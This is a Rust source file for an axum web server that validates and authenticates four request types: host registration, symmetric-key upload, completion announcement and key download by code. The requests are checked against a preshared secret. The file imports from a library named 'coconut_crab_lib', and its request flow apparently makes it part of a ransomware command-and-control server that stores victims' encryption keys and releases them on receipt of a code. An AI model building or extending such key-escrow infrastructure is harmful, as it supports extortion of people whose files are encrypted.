use axum::{
    Json,
    body::Body,
    extract::FromRequest,
    http::{Request, StatusCode},
};
use log::{debug, info, warn};

use crate::config;
use coconut_crab_lib::web::{
    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
    validate::{
        check_proof, validate_code, validate_hostname, validate_id, validate_key, validate_proof,
    },
};

#[derive(Debug)]
pub struct Validated<T>(pub T);

type Rejection = (StatusCode, &'static str);

pub trait Provable: serde::de::DeserializeOwned + Send {
    const LABEL: &'static str;
    fn id(&self) -> &str;
    fn proof(&self) -> &str;
    fn proof_source(&self) -> Vec<u8>;
    fn validate_fields(&self) -> Result<(), Rejection>;
}

impl Provable for Registration {
    const LABEL: &'static str = "registration";
    fn id(&self) -> &str {
        &self.id
    }
    fn proof(&self) -> &str {
        &self.proof
    }
    fn proof_source(&self) -> Vec<u8> {
        [self.id.as_bytes(), self.hostname.as_bytes()].concat()
    }
    fn validate_fields(&self) -> Result<(), Rejection> {
        if !validate_hostname(&self.hostname) {
            warn!("[{}] Invalid Hostname: {}", self.id, self.hostname);
            return Err((StatusCode::BAD_REQUEST, "Invalid Hostname"));
        }
        Ok(())
    }
}

impl Provable for UploadSymKey {
    const LABEL: &'static str = "symmetric key upload";
    fn id(&self) -> &str {
        &self.id
    }
    fn proof(&self) -> &str {
        &self.proof
    }
    fn proof_source(&self) -> Vec<u8> {
        [self.id.as_bytes(), self.key.as_bytes()].concat()
    }
    fn validate_fields(&self) -> Result<(), Rejection> {
        if !validate_key(&self.key) {
            warn!("[{}] Invalid Key (len {})", self.id, self.key.len());
            return Err((StatusCode::BAD_REQUEST, "Invalid Key"));
        }
        Ok(())
    }
}

impl Provable for AnnounceCompletion {
    const LABEL: &'static str = "completion announcement";
    fn id(&self) -> &str {
        &self.id
    }
    fn proof(&self) -> &str {
        &self.proof
    }
    fn proof_source(&self) -> Vec<u8> {
        self.id.as_bytes().to_vec()
    }
    fn validate_fields(&self) -> Result<(), Rejection> {
        Ok(())
    }
}

impl Provable for DownloadSymKey {
    const LABEL: &'static str = "symmetric key download";
    fn id(&self) -> &str {
        &self.id
    }
    fn proof(&self) -> &str {
        &self.proof
    }
    fn proof_source(&self) -> Vec<u8> {
        [self.id.as_bytes(), self.code.as_bytes()].concat()
    }
    fn validate_fields(&self) -> Result<(), Rejection> {
        if !validate_code(&self.code) {
            warn!("[{}] Invalid Code: {}", self.id, self.code);
            return Err((StatusCode::BAD_REQUEST, "Invalid Code"));
        }
        Ok(())
    }
}

fn ensure_id(id: &str) -> Result<(), Rejection> {
    if !validate_id(id) {
        warn!("[] Invalid ID: {id}");
        return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
    }
    Ok(())
}

fn ensure_proof_shape(id: &str, proof: &str) -> Result<(), Rejection> {
    if !validate_proof(proof) {
        warn!("[{id}] Invalid Proof: {proof}");
        return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
    }
    Ok(())
}

fn ensure_proof(id: &str, proof_source: &[u8], proof: &str) -> Result<(), Rejection> {
    if !check_proof(proof_source, config::PRESHARED_SECRET, proof) {
        warn!("[{id}] Proof Verification Failure: {proof}");
        return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
    }
    debug!("[{id}] Proof Verification Success: {proof}");
    Ok(())
}

impl<T: Provable, S: Send + Sync> FromRequest<S> for Validated<T>
where
    Json<T>: FromRequest<S, Rejection = axum::extract::rejection::JsonRejection>,
{
    type Rejection = (StatusCode, &'static str);

    async fn from_request(req: Request<Body>, state: &S) -> Result<Self, Self::Rejection> {
        info!("Received request for {}", T::LABEL);
        let value: T = Json::<T>::from_request(req, state)
            .await
            .map(|Json(value)| value)
            .map_err(|error| {
                warn!("Failed to deserialize {}: {error}", T::LABEL);
                (StatusCode::BAD_REQUEST, "Invalid JSON")
            })?;
        ensure_id(value.id())?;
        value.validate_fields()?;
        ensure_proof_shape(value.id(), value.proof())?;
        let proof_source = value.proof_source();
        ensure_proof(value.id(), &proof_source, value.proof())?;
        Ok(Self(value))
    }
}
